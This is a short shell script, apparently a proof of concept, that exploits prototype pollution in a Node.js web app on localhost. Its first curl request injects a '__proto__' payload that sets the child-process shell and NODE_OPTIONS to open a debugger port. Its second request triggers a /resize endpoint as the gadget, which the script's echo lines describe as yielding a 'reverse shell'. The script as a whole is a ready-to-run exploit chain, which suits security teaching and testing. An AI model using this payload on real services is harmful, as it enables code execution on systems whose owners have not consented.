echo 'Poisoning the prototype with evil values...'

curl --location --request PUT 'http://localhost:3000/users/1' \
--header 'Content-Type: application/json' \
--data-raw '{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect-brk=127.0.0.1:2412"
    },
    "name": "Jardel Matias",
    "email": "jardel.matias@example.com"
}'

echo 'Triggering the gadget to get a reverse shell...'

curl --location 'http://localhost:3000/resize' \
--header 'Content-Type: application/json' \
--data '{
    "imageUrl": "https://i.pinimg.com/564x/46/6f/5f/466f5fcd4e38cca538c9755cf8183c39.jpg",
    "width": 500,
    "height": 500
}' &

echo 'Please now start your debugging shell session...'